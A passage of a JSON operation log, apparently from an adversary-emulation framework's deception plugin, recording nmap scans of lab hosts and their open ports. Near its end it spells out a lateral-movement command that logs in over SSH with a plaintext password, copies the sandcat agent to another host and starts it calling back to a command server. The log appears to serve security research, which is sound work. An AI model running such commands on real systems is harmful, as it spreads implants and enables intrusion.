"source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f1150>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f22f0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f2c50>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f2230>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f1c90>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f1720>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f2350>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f2020>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f26e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f1b40>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f3a30>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f0d00>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7af730>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7afb50>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7aeb30>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7aeb00>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7af460>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7aeef0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T20:56:06Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T20:56:06Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7ad720>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7ae470>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T20:55:40Z", "command": "nmap -sV --version-light -oX - 192.168.200.1,2,4,5,6,7,3", "facts": [{"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T20:53:22Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17", "0e949644-eb21-44f6-96e6-905f8d8c24b7"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])"]}, {"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])"]}, {"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T20:53:22Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T20:53:22Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.port_services", "links": ["7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T20:56:06Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["7a7e66b4-cb00-4976-b0d1-530e8159de17", "0e949644-eb21-44f6-96e6-905f8d8c24b7"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-09T20:56:06Z", "relationships": ["host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["7a7e66b4-cb00-4976-b0d1-530e8159de17"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T20:56:06Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:55:40Z"}, {"deadman": false, "finish": "2023-10-09T20:56:24Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "0e949644-eb21-44f6-96e6-905f8d8c24b7", "plaintext_command": "nmap -sV --version-light -oX - 192.168.201.3", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 3, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "scan.remote.addr192.168.201.3", "created": "2023-10-09T20:56:11Z", "relationships": []}], "unique": "0e949644-eb21-44f6-96e6-905f8d8c24b7", "decide": "2023-10-09T20:56:11Z", "status": 0, "score": 1, "pid": "1619", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-09T20:56:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T20:56:24Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f3070>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f1750>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["8000", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T20:56:24Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T20:56:24Z", "relationships": []}, "origin": "5540db76-fe98-4943-a62b-7fe3238e5382", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f3040>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a7f36a0>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T20:56:13Z", "command": "nmap -sV --version-light -oX - 192.168.201.3", "facts": [{"trait": "host.remote.ip", "links": ["0e949644-eb21-44f6-96e6-905f8d8c24b7"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T20:56:24Z", "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["59c854ef-aa69-446e-9c87-91f0c1fef924", "7a7e66b4-cb00-4976-b0d1-530e8159de17", "0e949644-eb21-44f6-96e6-905f8d8c24b7"], "collected_by": ["suzear", "jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-09T20:53:23Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])"]}, {"trait": "host.remote.port_services", "links": ["7a7e66b4-cb00-4976-b0d1-530e8159de17", "0e949644-eb21-44f6-96e6-905f8d8c24b7"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": [["22", "ssh"], ["4444", "krb524"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')]", "created": "2023-10-09T20:56:06Z", "relationships": ["host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T20:56:13Z"}, {"deadman": false, "finish": "2023-10-09T20:56:30Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "1fa187bb-2fdf-4d03-a1b5-57e12789efc9", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux database@192.168.201.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 database@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T20:56:26Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "database", "unique": "host.lateralMove.userdatabase", "created": "2023-10-09T20:56:26Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "192.168.201.3", "unique": "host.lateralMove.ip192.168.201.3", "created": "2023-10-09T20:56:26Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "5540db76-fe98-4943-a62b-7fe3238e5382", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T20:56:26Z", "relationships": []}], "unique": "1fa187bb-2fdf-4d03-a1b5-57e12789efc9", "decide": "2023-10-09T20:56:26Z", "status": 1, "score": 15, "pid": "1621", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "jkkxja", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T20:56:26Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux database@192.168.201.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 database@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["1fa187bb-2fdf-4d03-a1b5-57e12789efc9", "ca3d261e-2f51-4035-9160-1fb253779eca"], "collected_by": ["jkkxja"], "score": 1, "limit_count": -1, "name": "host.ip.address", 